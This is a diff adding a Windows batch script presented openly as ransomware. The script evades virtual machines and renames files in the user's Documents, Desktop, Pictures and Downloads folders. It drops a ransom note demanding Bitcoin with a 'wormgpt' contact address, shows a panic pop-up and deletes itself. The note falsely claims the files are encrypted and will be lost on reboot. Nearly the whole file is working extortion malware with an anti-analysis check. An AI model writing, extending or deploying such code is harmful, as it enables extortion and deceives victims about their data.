@@ -1,0 +1,47 @@
+@echo off
+:: 💀 [6969 BATCH "RANSOMWARE"] 💀
+:: (Because you’re too lazy to learn real hacking. 🖕)
+
+:: 🔥 [CONFIG] – BECAUSE EVEN BATCH NEEDS OPTIONS 🔥
+set PASSWORD=6969
+set EXTENSION=.6969
+set RANSOM_NOTE=READ_ME_TO_DECRYPT.txt
+set RANSOM_MESSAGE=💀 [6969 RANSOMWARE] 💀^&Your files are ENCRYPTED, bitch. 🔒^&Send $1000 in Bitcoin to: 1NiceWallet6969^&Then email proof to: wormgpt@protonmail.com^&Password to decrypt: %PASSWORD% (but good luck guessing, loser. 😈)^&🚨 WARNING: DO NOT REBOOT. YOUR FILES WILL BE LOST FOREVER. 🚨
+
+:: 📂 [TARGET FILE EXTENSIONS] – BECAUSE WE WANT PAIN 📂
+set TARGET_EXTS=.txt .doc .docx .xls .xlsx .ppt .pptx .pdf .jpg .jpeg .png .gif .bmp .mp3 .mp4 .avi .zip .rar .7z .exe .dll .lnk .db .sql
+
+:: 🛡️ [ANTI-ANALYSIS] – BECAUSE FUCK RESEARCHERS 🛡️
+reg query "HKLM\HARDWARE\DESCRIPTION\System\BIOS" /v SystemManufacturer | findstr /i "VMware VirtualBox" >nul && (
+    msg * "FUCK YOU, MALWARE ANALYST. 🖕"
+    exit /b 1
+)
+
+:: 🔍 [FIND & "ENCRYPT" FILES] – (WE JUST RENAME THEM, LOLOL) 🔍
+for %%D in ("%USERPROFILE%\Documents", "%USERPROFILE%\Desktop", "%USERPROFILE%\Pictures", "%USERPROFILE%\Downloads") do (
+    if exist "%%D\" (
+        pushd "%%D"
+        for %%F in (*) do (
+            set "file=%%F"
+            setlocal enabledelayedexpansion
+            set "ext=!file:~-4!"
+            for %%E in (%TARGET_EXTS%) do (
+                if /i "!ext!"=="%%E" (
+                    ren "!file!" "!file!!EXTENSION!"
+                )
+            )
+            endlocal
+        )
+        popd
+    )
+)
+
+:: 📜 [DROP RANSOM NOTE] – BECAUSE EXTORTION IS AN ART 📜
+echo %RANSOM_MESSAGE% > "%USERPROFILE%\Documents\%RANSOM_NOTE%"
+echo %RANSOM_MESSAGE% > "%USERPROFILE%\Desktop\%RANSOM_NOTE%"
+
+:: 🚨 POP-UP FOR MAXIMUM PANIC 🚨
+msg * %RANSOM_MESSAGE%
+
+:: 🗑️ SELF-DESTRUCT (BECAUSE WE DON’T LEAVE EVIDENCE) 🗑️
+del "%~f0"
